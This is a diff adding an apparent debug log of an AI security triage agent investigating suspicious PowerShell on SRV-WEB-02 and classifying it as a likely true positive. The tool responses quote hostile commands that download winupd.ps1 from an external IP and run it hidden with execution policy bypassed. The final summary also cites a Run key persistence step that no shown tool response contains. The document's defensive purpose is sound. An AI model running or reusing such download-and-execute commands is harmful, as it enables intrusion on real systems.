@@ -1,0 +1,75 @@
+=== DEBUG SESSION START: 2026-03-02T23:10:20.617288+00:00 UTC ===
+
+[PLAYBOOK SELECTION]
+Alert Name: Suspicious PowerShell Script Execution
+Selected Playbook: suspicious_powershell.json
+
+[TOOL CALL]
+Tool: get_recent_events
+Arguments: {}
+
+[TOOL RESPONSE]
+[
+  {
+    "event_time": "2026-01-26T06:08:41.000Z",
+    "event_name": "PowerShellExecution",
+    "user": "r.kuznetsov",
+    "source_ip": "10.3.80.44",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest http://91.214.88.109/winupd.ps1 -OutFile C:\\ProgramData\\winupd.ps1"
+  },
+  {
+    "event_time": "2026-01-26T06:11:02.000Z",
+    "event_name": "PowerShellExecution",
+    "user": "r.kuznetsov",
+    "source_ip": "10.3.80.44",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\winupd.ps1"
+  }
+]
+
+
+[TOOL CALL]
+Tool: get_recent_similar_alerts
+Arguments: {}
+
+[TOOL RESPONSE]
+[
+  {
+    "alert_id": "SOC-9621",
+    "alert_name": "Suspicious PowerShell Script Execution",
+    "start_time": "2026-01-26T06:08:41.000Z",
+    "source_ip": "10.3.80.44",
+    "endpoint": "SRV-WEB-02",
+    "user": "r.kuznetsov",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest http://91.214.88.109/winupd.ps1 -OutFile C:\\ProgramData\\winupd.ps1"
+  },
+  {
+    "alert_id": "SOC-9622",
+    "alert_name": "Suspicious PowerShell Script Execution",
+    "start_time": "2026-01-26T06:11:02.000Z",
+    "source_ip": "10.3.80.44",
+    "endpoint": "SRV-WEB-02",
+    "user": "r.kuznetsov",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\winupd.ps1"
+  }
+]
+
+
+[FINAL LLM OUTPUT]
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-9623",
+    "Start Time": "2026-01-26T06:14:39.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.3.80.44",
+    "Destination IP": "91.214.88.109",
+    "Endpoint": "SRV-WEB-02",
+    "User": "r.kuznetsov",
+    "Playbook Used": "Suspicious PowerShell Triage",
+    "Description": "PowerShell was used to persist a script by adding a Run key entry under HKCU to launch a hidden PowerShell script from C:\\ProgramData\\winupd.ps1 with bypassed execution policy. The file is downloaded from an external host 91.214.88.109/winupd.ps1 before execution observed in earlier events, indicating potential malicious activity. This pattern matches prior similar alerts and shows persistence and external download indicators, suggesting heightened risk and the need for investigation.",
+    "External URL accessed": "http://91.214.88.109/winupd.ps1",
+    "Persistence technique": "Registry Run key modification (HKCU) to launch PowerShell script",
+    "Recent related alerts": "SOC-9621 and SOC-9622 observed from same source and endpoint with similar scriptblock"
+  },
+  "classification": "HP"
+}
+
